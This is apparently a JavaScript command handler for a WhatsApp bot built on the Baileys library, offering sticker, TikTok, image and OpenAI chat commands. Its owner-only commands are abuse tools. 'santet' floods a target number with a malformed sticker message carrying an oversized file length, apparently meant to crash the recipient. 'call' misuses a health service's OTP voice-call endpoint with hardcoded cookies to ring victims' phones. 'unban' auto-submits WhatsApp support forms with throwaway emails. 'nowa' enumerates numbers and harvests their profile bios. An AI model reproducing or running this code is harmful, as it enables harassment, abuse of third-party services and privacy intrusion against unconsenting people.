"use strict";
require('./anu')
const {
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    proto,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType
} = require('@adiwajshing/baileys')
const {
    downloadContentFromMessage,
    generateWAMessage,
    generateWAMessageFromContent,
    MessageType,
    buttonsMessage
} = require("@adiwajshing/baileys")
const {
    exec,
    spawn
} = require("child_process");
const {
    color,
    bgcolor,
    pickRandom,
    randomNomor
} = require('./lib/console.js')
const {
    isUrl,
    getRandom,
    getGroupAdmins,
    runtime,
    sleep,
    reSize,
    makeid,
    fetchJson,
    getBuffer
} = require("./lib/myfunc");
const {
    Darkjokes
} = require("dhn-api");
const fs = require("fs");
const chalk = require('chalk');
const axios = require("axios");
const cheerio = require("cheerio");
const colors = require('colors/safe');
const crypto = require("crypto")
const ffmpeg = require("fluent-ffmpeg");
const moment = require("moment-timezone");
const setting = JSON.parse(fs.readFileSync('./setting.json'));
const mess = JSON.parse(fs.readFileSync('./mess.json'));
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = async (conn, msg, m, setting, store) => {
    try {
        let {
            ownerNumber,
            botName
        } = setting
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe,
            isBaileys
        } = msg
        if (msg.isBaileys) return
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
        const tanggal = moment().tz("Asia/Jakarta").format("ll")
        let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
        const ucapanWaktu = "Selamat " + dt.charAt(0).toUpperCase() + dt.slice(1)
        const content = JSON.stringify(msg.message)
        const from = msg.key.remoteJid
        const time = moment(new Date()).format("HH:mm");
        var chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
        if (chats == undefined) {
            chats = ''
        }
        const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
        const isGroup = msg.key.remoteJid.endsWith('@g.us')
        const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
        const pushname = msg.pushName
        const body = chats.startsWith(prefix) ? chats : ''
        const budy = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : ''
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(" ");
        const isCommand = body.startsWith(prefix);
        const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const isCmd = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;

        // Settings
        const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'
        const isOwner = [`${global.ownerNumber}`].includes(sender) ? true : false
        const isPremium = prem.includes(sender)


        const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const groupId = isGroup ? groupMetadata.id : ''
        const participants = isGroup ? await groupMetadata.participants : ''
        const groupMembers = isGroup ? groupMetadata.participants : ''
        const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
        const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
        const isGroupAdmins = groupAdmins.includes(sender)
        const quoted = msg.quoted ? msg.quoted : msg
        const isImage = (type == 'imageMessage')
        const isQuotedMsg = (type == 'extendedTextMessage')
        const isMedia = (type === 'imageMessage' || type === 'videoMessage');
        const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
        const isVideo = (type == 'videoMessage')
        const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
        const isSticker = (type == 'stickerMessage')
        const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
        var dataGroup = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
        var dataPrivate = (type === "messageContextInfo") ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
        const isButton = dataGroup.length !== 0 ? dataGroup : dataPrivate
        var dataListG = (type === "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        var dataList = (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
        const isListMessage = dataListG.length !== 0 ? dataListG : dataList

        function mentions(teks, mems = [], id) {
            if (id == null || id == undefined || id == false) {
                let res = conn.sendMessage(from, {
                    text: teks,
                    mentions: mems
                })
                return res
            } else {
                let res = conn.sendMessage(from, {
                    text: teks,
                    mentions: mems
                }, {
                    quoted: msg
                })
                return res
            }
        }
        const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
        const fkontak = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: "status@broadcast"
                } : {})
            },
            message: {
                'contactMessage': {
                    'displayName': `R o b o t i c\n`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;R o b o t i c,;;;\nFN:Hi ${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': {
                        url: global.thumb
                    }
                }
            }
        }

        async function downloadAndSaveMediaMessage(type_file, path_file) {
            if (type_file === 'image') {
                var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
                let buffer = Buffer.from([])
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(path_file, buffer)
                return path_file
            } else if (type_file === 'video') {
                var stream = await downloadContentFromMessage(msg.message.videoMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
                let buffer = Buffer.from([])
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(path_file, buffer)
                return path_file
            } else if (type_file === 'sticker') {
                var stream = await downloadContentFromMessage(msg.message.stickerMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
                let buffer = Buffer.from([])
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(path_file, buffer)
                return path_file
            } else if (type_file === 'audio') {
                var stream = await downloadContentFromMessage(msg.message.audioMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.audioMessage, 'audio')
                let buffer = Buffer.from([])
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(path_file, buffer)
                return path_file
            }
        }

        const hallo = {
            key: {
                fromMe: [],
                participant: "0@s.whatsapp.net",
                ...(from ? {
                    remoteJid: ""
                } : {})
            },

            'message': {
                "stickerMessage": {
                    "url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
                    "fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
                    "fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
                    "mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
                    "mimetype": "image/webp",
                    "height": 40,
                    "width": 40,
                    "directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
                    "fileLength": "99999999999999999",
                    "mediaKeyTimestamp": "16572901099967",
                    'isAnimated': []
                }
            }
        }

        async function reply(teks) {
            const kenz = {
                contextInfo: {
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        showAdAttribution: true,
                        title: setting.botName,
                        body: setting.Title,
                        previewType: "PHOTO",
                        thumbnailUrl: global.thumb,
                        sourceUrl: `https://wa.me/48666666672`,
                    },
                },
                text: teks,
            };
            return conn.sendMessage(from, kenz, {
                quoted: msg,
            });
        }

        function parseMention(text = '') {
            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
        }

        if (isGroup && isCmd) {
            console.log(colors.green.bold("[Group]") + " " + colors.brightCyan(time, ) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(groupName));
        }
        if (!isGroup && isCmd) {
            console.log(colors.green.bold("[Private]") + " " + colors.brightCyan(time, ) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(pushname));
        }

        const contacts = JSON.parse(fs.readFileSync("./data/database/contacts.json"))
        const isContacts = contacts.includes(sender)

        const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        switch (command) {
            //========================================//

            // 🔥 ADD & DEL PREMIUM 🔥
            case 'addprem':
                if (!isOwner) return reply(global.messPrem)
                if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 628123456789`)
                let prrkek = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
                let ceknya = await conn.onWhatsApp(prrkek)
                if (ceknya.length == 0) return reply(`Please Enter Valid Number!!!`)
                prem.push(prrkek)
                fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
                reply(`${prrkek} Has Been Premium!`)
                break
            case 'delprem':
                if (!isOwner) return reply(global.messPrem)
                if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 628123456789`)
                let ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
                let unp = prem.indexOf(ya)
                prem.splice(unp, 1)
                fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
                reply(`${ya} Has Been Removed Premium!`)
                break
                //========================================//

                // 🔥 FUN FEATURES 🔥
            case 'sticker':
            case 's':
            case 'stiker': {
                if (isImage || isQuotedImage) {
                    let media = await downloadAndSaveMediaMessage('image', `./gambar/${tanggal}.jpg`)
                    conn.sendImageAsSticker(from, media, msg, {
                        packname: `DJong`,
                        author: ``
                    })
                } else if (isVideo || isQuotedVideo) {
                    let media = await downloadAndSaveMediaMessage('video', `./sticker/${tanggal}.mp4`)
                    conn.sendVideoAsSticker(from, media, msg, {
                        packname: `DJong`,
                        author: ``
                    })
                } else {
                    reply(`Kirim/reply gambar/vidio dengan caption *${prefix+command}*`)
                }
            }
            break
            case 'tiktokvideo': {
                if (!isPremium) return reply(global.messPrem)
                if (!msg) return reply(`Example : ${prefix + command} link`)
                if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
                sleep()
                require('./lib/tiktok').Tiktok(q).then(data => {
                    conn.sendMessage(from, {
                        caption: `*Succes*`,
                        video: {
                            url: data.watermark
                        }
                    }, {
                        quoted: msg
                    })
                })
            }
            break
            case 'tiktokaudio': {
                if (!isPremium) return reply(global.messPrem)
                if (!q) return reply(`Example : ${prefix + command} link`)
                if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
                sleep()
                require('./lib/tiktok').Tiktok(q).then(data => {
                    conn.sendMessage(from, {
                        audio: {
                            url: data.audio
                        },
                        mimetype: 'audio/mp4'
                    }, {
                        quoted: msg
                    })
                })
            }
            break

            case 'waifu': {
                if (!isPremium) return reply(global.messPrem)
                sleep()
                let waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)
                await conn.sendMessage(from, {
                    image: {
                        url: waifudd.data.url
                    },
                    caption: `>///<`
                }, {
                    quoted: msg
                }).catch(err => {
                    return ('Error!')
                })
            }
            break
            case 'pinterest': {
                if (!isPremium) return reply(global.messPrem)
                if (!q) return reply(`Enter Query`)
                sleep()
                let {
                    pinterest
                } = require('./lib/scraper')
                let anutrest = await pinterest(q)
                let result = anutrest[Math.floor(Math.random() * anutrest.length)]
                conn.sendMessage(from, {
                    image: {
                        url: `${result}`
                    },
                    caption: 'Media Url : ' + result
                }, {
                    quoted: msg
                })
            }
            break
            case "darkjoke":
            case "darkjokes": {
                if (!isPremium) return reply(global.messPrem)
                await sleep()
                var ress = await Darkjokes()
                let teks = ""
                conn.sendMessage(from, {
                    image: {
                        url: ress
                    },
                    caption: teks
                }, {
                    quoted: msg
                })
            }
            break
            case 'couple': {
                if (!isPremium) return reply(global.messPrem)
                await sleep()
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                conn.sendMessage(from, {
                    image: {
                        url: random.male
                    },
                    caption: `Couple Male`
                }, {
                    quoted: msg
                })
                conn.sendMessage(from, {
                    image: {
                        url: random.female
                    },
                    caption: `Couple Female`
                }, {
                    quoted: msg
                })
            }
            break

            case 'santet': {
                if (!isOwner) return reply(global.messOwner)
                if (args.length < 1) return reply(`${prefix}${command} number|count`)
                let numbers = q.split('|')[0]
                let count = q.split('|')[1]
                for (let i = 0; i < count; i++) {
                    await sleep(10000)
                    conn.sendMessage(`${numbers}@s.whatsapp.net`, {
                        'text': 'kak'
                    }, {
                        'quoted': hallo
                    })
                }
            }
            break
            //========================================//

            //🔥 OTHER MENU 🔥
            case "aimage": {
                if (!isPremium) return reply(global.messPrem)
                try {
                    if (global.keyopenai === '') return reply("Apikey limit exceeded");
                    if (!q) return reply(`Generate image from AI.\n\nExample:\n${prefix + command} man riding horse`)
                    const {
                        Configuration,
                        OpenAIApi
                    } = require('openai')
                    const configuration = new Configuration({
                        apiKey: global.keyopenai,
                    });
                    const openai = new OpenAIApi(configuration);
                    const response = await openai.createImage({
                        prompt: q,
                        n: 1,
                        size: "512x512",
                    });
                    //console.log(response.data.data[0].url)
                    conn.sendImage(from, response.data.data[0].url, q, msg);
                } catch (err) {
                    console.log(err);
                    reply("Sorry, there seems to be an error :" + err);
                }
            }
            break
            case 'ai':
            case 'openai': {
                if (!isPremium) return reply(global.messPrem)
                try {
                    if (global.keyopenai === '') return reply("Api key limi exceeded");
                    if (!q) return reply(`Chat with AI.\n\nExample:\n${prefix + command} What is coding`)
                    const {
                        Configuration,
                        OpenAIApi
                    } = require('openai')
                    const configuration = new Configuration({
                        apiKey: global.keyopenai,
                    });
                    const openai = new OpenAIApi(configuration);
                    const response = await openai.createCompletion({
                        model: "text-davinci-003",
                        prompt: q,
                        temperature: 0.3,
                        max_tokens: 2000,
                        top_p: 1.0,
                        frequency_penalty: 0.0,
                        presence_penalty: 0.0,
                    });
                    reply(`${response.data.choices[0].text}`);
                } catch (error) {
                    if (error.response) {
                        console.log(error.response.status);
                        console.log(error.response.data);
                        console.log(`${error.response.status}\n\n${error.response.data}`);
                    } else {
                        console.log(error);
                        reply("Sorry, there seems to be an error :" + error.message);
                    }
                }
            }
            break
            //🔥 NSFW 🔥
            /*case 'hentai' : {
            if (!isPremium) return reply(global.messPrem)
            await sleep()
            let waifuku = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
            conn.sendMessage(from, {image: {url:waifuku.data.url},caption:`>///<`}, { quoted: msg }).catch(err => {
             return('Error!')
            })
            }
            break
            */


            //🔥OTHER FEATURES 🔥

            case "call": {
                if (!isOwner) return reply(global.messOwner)
                await sleep()
                if (!args[0]) return reply(`Usage ${prefix+command} number\nEx: ${prefix+command} +628123456789`)
                let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
                if (args[0].startsWith(`+6285708302016, +62857083020161`)) return reply('Cant call this number!')
                axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests', {
                    'phone_number': `${nosend}`,
                    'channel': 'voice'
                }, {
                    headers: {
                        'authority': 'magneto.api.halodoc.com',
                        'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                        'cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D',
                        'origin': 'https://www.halodoc.com',
                        'sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-site',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53',
                        'x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'
                    }
                }).then(function(response) {
                    reply(`Trying to call: ${nosend}\n\nNote: This feature does not always work`)
                }).catch(function(error) {
                    reply(`Failed Call ${nosend}`)
                })
            }
            break
            case 'unban': {
                if (!isOwner) return reply(global.messOwner)
                if (m.quoted || q) {
                    var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    if (tosend === global.ownerNumber) return reply(`Use another number!`)
                    var targetnya = tosend.split('@')[0]
                    try {
                        var axioss = require('axios')
                        let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
                        let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
                        let cookie = ntah.headers["set-cookie"].join("; ")
                        const cheerio = require('cheerio');
                        let $ = cheerio.load(ntah.data)
                        let $form = $("form");
                        let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
                        let form = new URLSearchParams()
                        form.append("jazoest", $form.find("input[name=jazoest]").val())
                        form.append("lsd", $form.find("input[name=lsd]").val())
                        form.append("step", "submit")
                        form.append("country_selector", "+")
                        form.append("phone_number", `+${targetnya}`, )
                        form.append("email", email.data[0])
                        form.append("email_confirm", email.data[0])
                        form.append("platform", "ANDROID")
                        form.append("your_message", `لم يتلق حسابي أي رد من WhatsApp Business: [+${targetnya}]
Terimakasih`)
                        form.append("__user", "0")
                        form.append("__a", "1")
                        form.append("__csr", "")
                        form.append("__req", "8")
                        form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
                        form.append("dpr", "1")
                        form.append("__ccg", "UNKNOWN")
                        form.append("__rev", "1007735016")
                        form.append("__comment_req", "0")

                        let res = await axioss({
                            url,
                            method: "POST",
                            data: form,
                            headers: {
                                cookie
                            }

                        })
                        reply(`Being processed!\n\nNote: Wait less than 24 hours your number will be opened`)
                        await sleep(90000)
                        let payload = String(res.data)
                        if (payload.includes(`"payload":true`)) {} else if (payload.includes(`"payload":false`)) {} else reply(util.format(res.data))
                    } catch (err) {
                        reply(`${err}`)
                    }
                } else reply('Enter a number!')
            }
            break
            case 'nowa': {
                if (!isOwner) return reply(global.messOwner)
                const mark_slebew = '0@s.whatsapp.net'
                const more = String.fromCharCode(8206)
                const strip_ny = more.repeat(4001)
                var footer_nya = `${global.botName}`
                if (!args[0]) return reply('Input Number')
                var noteks = args[0]
                if (!noteks.includes('x')) return reply(`There is something wrong!`)

                function countInstances(string, word) {
                    return string.split(word).length - 1;
                }
                var nomer0 = noteks.split('x')[0]
                var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
                var random_length = countInstances(noteks, 'x')
                var random;
                if (random_length == 1) {
                    random = 10
                } else if (random_length == 2) {
                    random = 100
                } else if (random_length == 3) {
                    random = 1000
                }
                var nomerny = `• Registered\n\n`
                var no_bio = `\n• No status\n\n`
                var no_watsap = `\n• Unregister\n\n`
                for (let i = 0; i < random; i++) {
                    var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
                    var dom1 = nu[Math.floor(Math.random() * nu.length)]
                    var dom2 = nu[Math.floor(Math.random() * nu.length)]
                    var dom3 = nu[Math.floor(Math.random() * nu.length)]
                    var dom4 = nu[Math.floor(Math.random() * nu.length)]
                    var rndm;
                    if (random_length == 1) {
                        rndm = `${dom1}`
                    } else if (random_length == 2) {
                        rndm = `${dom1}${dom2}`
                    } else if (random_length == 3) {
                        rndm = `${dom1}${dom2}${dom3}`
                    } else if (random_length == 4) {
                        rndm = `${dom1}${dom2}${dom3}${dom4}`
                    }
                    var anu = await conn.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
                    var anuu = anu.length !== 0 ? anu : false
                    try {
                        try {
                            var anu1 = await conn.fetchStatus(anu[0].jid)
                        } catch {
                            var anu1 = '401'
                        }
                        if (anu1 == '401' || anu1.status.length == 0) {
                            no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                        } else {
                            nomerny += `❑ wa.me/${anu[0].jid.split("@")[0]}\n❑ Bio : *${anu1.status}*\n❑ Tanggal : *${moment(anu1.setAt).tz('Asia/Jakarta').format('DD/MM/YYYY')}*\n\n`
                        }
                    } catch {
                        no_watsap += `${nomer0}${i}${nomer1}\n`
                    }
                }
                reply(`${nomerny}${no_bio}${no_watsap}`)
            }
            break
            //========================================//


            // 🔥 MENU 🔥
            case "menu":
            case "help": {
                let text = `Hi @${sender.split`@`[0]}, This is a list of available commands\n
┌──⭓ Fun Menu
│
│⎚ ${prefix}sticker
│⎚ ${prefix}waifu
│⎚ ${prefix}darkjoke
│⎚ ${prefix}couple
│⎚ ${prefix}pinterest <query>
│⎚ ${prefix}tiktokvideo <url>
│⎚ ${prefix}tiktokaudio <url>
│
└───────⭓

┌──⭓ Other Menu
│
│⎚ ${prefix}ai
│⎚ ${prefix}aimage
│
└───────⭓

┌──⭓ Owner Menu
│
│⎚ ${prefix}nowa <number>
│⎚ ${prefix}call <number>
│⎚ ${prefix}santet <number|count>
│⎚ ${prefix}unban <number>
│⎚ ${prefix}addprem <number>
│⎚ ${prefix}delprem <number>
│
└───────⭓
`
                conn.sendMessage(from, {
                    text,
                    contextInfo: {
                        mentionedJid: parseMention(text),
                        externalAdReply: {
                            title: `${botName}`,
                            mediaType: 1,
                            previewType: 0,
                            renderLargerThumbnail: true,
                            previewType: "PHOTO",
                            thumbnailUrl: global.thumb,
                            sourceUrl: `https://wa.me/48666666672`,
                        },
                    },

                }, {
                    quoted: msg
                })


            }
            break


            default:
        }
    } catch (err) {
        console.log(color('[ERROR]', 'red'), err)
        const isGroup = msg.key.remoteJid.endsWith('@g.us')
        const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
        const moment = require("moment-timezone");
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
        const tanggal = moment().tz("Asia/Jakarta").format("ll")
        let kon_erorr = {
            "tanggal": tanggal,
            "jam": jam,
            "error": err,
            "user": sender
        }
        db_error.push(kon_erorr)
        fs.writeFileSync('./database/error.json', JSON.stringify(db_error))
        var errny = `*SERVER ERROR*
*Dari:* @${sender.split("@")[0]}
*Jam:* ${jam}
*Tanggal:* ${tanggal}
*Tercatat:* ${db_error.length}
*Type:* ${err}`
        conn.sendMessage(setting.ownerNumber, {
            text: errny,
            mentions: [sender]
        })
    }
}